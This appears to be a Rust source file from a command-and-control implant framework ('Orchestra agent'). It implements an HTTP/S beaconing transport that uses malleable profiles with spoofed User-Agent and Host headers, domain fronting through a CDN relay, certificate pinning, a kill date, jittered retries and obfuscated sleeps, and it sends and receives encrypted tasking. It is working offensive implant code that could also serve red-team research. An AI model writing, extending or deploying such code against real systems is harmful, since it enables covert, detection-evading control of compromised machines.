//! HTTP/S malleable-profile transport for the Orchestra agent.
//!
//! # Status: EXPERIMENTAL — not wired into the default startup path
//!
//! This module implements a `Transport` that tunnels agent messages over
//! HTTP/S using a malleable C2 profile (custom User-Agent, Host header,
//! URI staging, etc.).
//!
//! ## How to enable
//!
//! 1. Set `malleable_profile` in `agent.toml`.
//! 2. In `agent/src/lib.rs` `Agent::new()`, replace the default TLS transport
//!    with `c2_http::HttpTransport::new(&profile, session).await?`.
//!
//! The server side must expose the staging URI via its reverse proxy; see
//! `docs/C_SERVER.md` for configuration details.
//!
//! ## Security warning
//!
//! This transport does **not** enforce certificate pinning by itself; pinning
//! is handled by the underlying `reqwest` client when `danger_accept_invalid_certs`
//! is `false` and a `server_cert_fingerprint` is configured.

use anyhow::{anyhow, Result};
use async_trait::async_trait;
use common::config::MalleableProfile;
use common::{CryptoSession, Message, Transport};
use sha2::{Digest, Sha256};
use std::sync::Arc;
use tokio::time::Duration;

/// Verify that the current date is before the kill date.
/// `kill_date` must be in `YYYY-MM-DD` format (UTC).
fn check_kill_date(kill_date: &str) -> Result<()> {
    check_kill_date_pub(kill_date)
}

/// Public wrapper around kill-date enforcement used by `Agent::new()` (4-2).
pub fn check_kill_date_pub(kill_date: &str) -> Result<()> {
    // Parse as YYYY-MM-DD; produce a comparable 8-digit integer YYYYMMDD.
    let parts: Vec<&str> = kill_date.splitn(3, '-').collect();
    if parts.len() != 3 {
        anyhow::bail!("invalid kill_date format '{}'; expected YYYY-MM-DD", kill_date);
    }
    let y: u32 = parts[0].parse().map_err(|_| anyhow!("invalid kill_date year"))?;
    let m: u32 = parts[1].parse().map_err(|_| anyhow!("invalid kill_date month"))?;
    let d: u32 = parts[2].parse().map_err(|_| anyhow!("invalid kill_date day"))?;
    let kd_val = y * 10_000 + m * 100 + d;

    // Derive today's date from the Unix epoch (UTC, no external deps).
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let days_since_epoch = secs / 86400;
    // Compute year/month/day from days_since_epoch (proleptic Gregorian, UTC).
    let (ty, tm, td) = days_to_ymd(days_since_epoch);
    let today_val = ty * 10_000 + tm * 100 + td;

    if today_val >= kd_val {
        anyhow::bail!("kill date {} has passed; agent refusing to connect", kill_date);
    }
    Ok(())
}

/// Convert days since the Unix epoch (1970-01-01) to (year, month, day).
fn days_to_ymd(days: u64) -> (u32, u32, u32) {
    // Algorithm: http://howardhinnant.github.io/date_algorithms.html#civil_from_days
    let z = days as i64 + 719468;
    let era = if z >= 0 { z } else { z - 146096 } / 146097;
    let doe = (z - era * 146097) as u64;
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    let y = yoe as i64 + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };
    (y as u32, m as u32, d as u32)
}

/// Custom `ServerCertVerifier` that pins the server certificate by its
/// SHA-256 fingerprint (64 lowercase hex characters).  If the presented
/// end-entity certificate's DER encoding does not hash to the expected
/// fingerprint, the TLS handshake is rejected.
///
/// When `expected_fingerprint` is `None`, the verifier delegates to rustls's
/// built-in `WebPkiVerifier` with platform root certificates — i.e. standard
/// CA-based verification.
struct FingerprintVerifier {
    expected_fingerprint: Option<String>,
    webpki: rustls_0_21::client::WebPkiVerifier,
}

impl FingerprintVerifier {
    fn new(expected_fingerprint: Option<String>) -> Self {
        let mut root_store = rustls_0_21::RootCertStore::empty();
        for cert in rustls_native_certs::load_native_certs()
            .certs
            .into_iter()
            .map(|c| rustls_0_21::Certificate(c.as_ref().to_vec()))
        {
            root_store.add(&cert).ok();
        }
        let webpki = rustls_0_21::client::WebPkiVerifier::new(root_store, None);
        Self {
            expected_fingerprint,
            webpki,
        }
    }
}

impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
    fn verify_server_cert(
        &self,
        end_entity: &rustls_0_21::Certificate,
        intermediates: &[rustls_0_21::Certificate],
        server_name: &rustls_0_21::ServerName,
        scts: &mut dyn Iterator<Item = &[u8]>,
        ocsp_response: &[u8],
        now: std::time::SystemTime,
    ) -> Result<rustls_0_21::client::ServerCertVerified, rustls_0_21::Error> {
        // Always compute the fingerprint of the end-entity certificate.
        let digest = Sha256::digest(&end_entity.0);
        let hex_fp = hex::encode(digest);

        if let Some(ref expected) = self.expected_fingerprint {
            // Certificate pinning mode: compare fingerprints.
            if hex_fp != expected.to_lowercase() {
                log::error!(
                    "cert pinning: fingerprint mismatch (got {}, expected {})",
                    hex_fp,
                    expected
                );
                return Err(rustls_0_21::Error::InvalidCertificate(
                    rustls_0_21::CertificateError::UnknownIssuer,
                ));
            }
            // Fingerprint matches — accept the certificate without CA chain
            // validation since we are pinning the exact cert.
            log::debug!("cert pinning: fingerprint verified OK");
            Ok(rustls_0_21::client::ServerCertVerified::assertion())
        } else {
            // No fingerprint configured — fall back to standard WebPKI verification.
            self.webpki
                .verify_server_cert(end_entity, intermediates, server_name, scts, ocsp_response, now)
        }
    }

    fn verify_tls12_signature(
        &self,
        message: &[u8],
        cert: &rustls_0_21::Certificate,
        dss: &rustls_0_21::DigitallySignedStruct,
    ) -> Result<rustls_0_21::client::HandshakeSignatureValid, rustls_0_21::Error> {
        self.webpki.verify_tls12_signature(message, cert, dss)
    }

    fn verify_tls13_signature(
        &self,
        message: &[u8],
        cert: &rustls_0_21::Certificate,
        dss: &rustls_0_21::DigitallySignedStruct,
    ) -> Result<rustls_0_21::client::HandshakeSignatureValid, rustls_0_21::Error> {
        self.webpki.verify_tls13_signature(message, cert, dss)
    }
}

pub struct HttpTransport {
    profile: MalleableProfile,
    client: reqwest::Client,
    session: CryptoSession,
    agent_id: String,
}

impl HttpTransport {
    pub async fn new(
        profile: &MalleableProfile,
        session: CryptoSession,
        agent_id: String,
        cert_fingerprint: Option<String>,
    ) -> Result<Self> {
        // Enforce kill date: refuse to connect after the configured date (4-2).
        if !profile.kill_date.is_empty() {
            check_kill_date(&profile.kill_date)?;
        }
        // Malleable profile headers
        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert(
            reqwest::header::USER_AGENT,
            reqwest::header::HeaderValue::from_str(&profile.user_agent)?,
        );
        if !profile.host_header.is_empty() {
            headers.insert(
                reqwest::header::HOST,
                reqwest::header::HeaderValue::from_str(&profile.host_header)?,
            );
        }

        // Build HTTP client with rustls and custom headers.
        // When cert_fingerprint is set, install a custom certificate verifier
        // that pins the server's end-entity certificate by SHA-256 fingerprint.
        let client = if cert_fingerprint.is_some() {
            let verifier = FingerprintVerifier::new(cert_fingerprint);
            let config = rustls_0_21::ClientConfig::builder()
                .with_safe_defaults()
                .with_custom_certificate_verifier(Arc::new(verifier))
                .with_no_client_auth();
            reqwest::Client::builder()
                .use_preconfigured_tls(config)
                .default_headers(headers)
                .build()?
        } else {
            reqwest::Client::builder()
                .use_rustls_tls()
                .default_headers(headers)
                .build()?
        };

        Ok(Self {
            profile: profile.clone(),
            client,
            session,
            agent_id,
        })
    }

    async fn connect_with_retry(
        &self,
        req_builder: reqwest::RequestBuilder,
    ) -> Result<reqwest::Response> {
        let mut delay = 1;
        let mut attempt = 0u32;
        const MAX_ATTEMPTS: u32 = 8;
        loop {
            attempt += 1;
            if attempt > MAX_ATTEMPTS {
                anyhow::bail!("C2 unreachable after {} attempts; giving up", MAX_ATTEMPTS);
            }
            // Apply jitter to backoff
            let jitter = rand::random::<f64>() * 0.2 + 0.9;
            let current_delay = (delay as f64 * jitter) as u64;

            // Clone builder since we might retry
            match req_builder
                .try_clone()
                .ok_or_else(|| anyhow!("Failed to clone request"))?
                .send()
                .await
            {
                Ok(resp) => return Ok(resp),
                Err(e) => {
                    log::warn!(
                        "HTTP connection failed: {}. Retrying in {}s...",
                        e,
                        current_delay
                    );
                    crate::memory_guard::guarded_sleep(Duration::from_secs(current_delay), None)
                        .await?;
                    delay *= 2;
                    if delay > 64 {
                        delay = 64;
                    }
                }
            }
        }
    }
}

#[async_trait]
impl Transport for HttpTransport {
    async fn send(&mut self, msg: Message) -> Result<()> {
        log::debug!(
            "Malleable HTTP C2 Send with profile User-Agent: {}",
            self.profile.user_agent
        );

        let endpoint = if self.profile.cdn_relay {
            // Domain fronting: TCP connection goes to the CDN endpoint,
            // while the Host HTTP header carries the C2 domain (set in new()).
            if self.profile.cdn_endpoint.is_empty() {
                anyhow::bail!(
                    "cdn_relay is enabled but cdn_endpoint is not set; \
                     configure the CDN relay address in the malleable profile"
                );
            }
            format!("https://{}", self.profile.cdn_endpoint)
        } else {
            // Direct C2: operator must configure direct_c2_endpoint.
            if self.profile.direct_c2_endpoint.is_empty() {
                anyhow::bail!("direct_c2_endpoint is not configured; set it in the malleable profile for non-CDN deployments");
            }
            self.profile.direct_c2_endpoint.clone()
        };

        // Serialize and encrypt payload
        let serialized = bincode::serialize(&msg)?;
        let ciphertext = self.session.encrypt(&serialized);

        // POST request
        let req = self
            .client
            .post(format!("{}{}", endpoint, self.profile.uri))
            .body(ciphertext);
        let resp = self.connect_with_retry(req).await?;
        if !resp.status().is_success() {
            anyhow::bail!("C2 POST returned HTTP {}", resp.status());
        }

        Ok(())
    }

    async fn recv(&mut self) -> Result<Message> {
        log::debug!("Malleable HTTP C2 Recv polling via GET");

        let endpoint = if self.profile.cdn_relay {
            // Domain fronting: TCP connection goes to the CDN endpoint,
            // while the Host HTTP header carries the C2 domain (set in new()).
            if self.profile.cdn_endpoint.is_empty() {
                anyhow::bail!(
                    "cdn_relay is enabled but cdn_endpoint is not set; \
                     configure the CDN relay address in the malleable profile"
                );
            }
            format!("https://{}", self.profile.cdn_endpoint)
        } else {
            if self.profile.direct_c2_endpoint.is_empty() {
                anyhow::bail!("direct_c2_endpoint is not configured; set it in the malleable profile for non-CDN deployments");
            }
            self.profile.direct_c2_endpoint.clone()
        };

        let req = self.client.get(format!("{}{}", endpoint, self.profile.uri));
        let resp = self.connect_with_retry(req).await?;
        let bytes = resp.bytes().await?;

        if bytes.is_empty() {
            // No tasking: sleep with jitter then signal the caller with a Heartbeat
            // so the main loop continues rather than treating this as a transport error.
            let sleep_dur = crate::obfuscated_sleep::calculate_jittered_sleep(
                &common::config::SleepConfig::default(),
            );
            crate::memory_guard::guarded_sleep(sleep_dur, None).await?;
            return Ok(Message::Heartbeat {
                timestamp: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs(),
                agent_id: self.agent_id.clone(),
                status: "idle".to_string(),
            });
        }

        // Decrypt and deserialize
        let plaintext = self.session.decrypt(&bytes)?;
        let msg = bincode::deserialize(&plaintext)?;
        Ok(msg)
    }
}
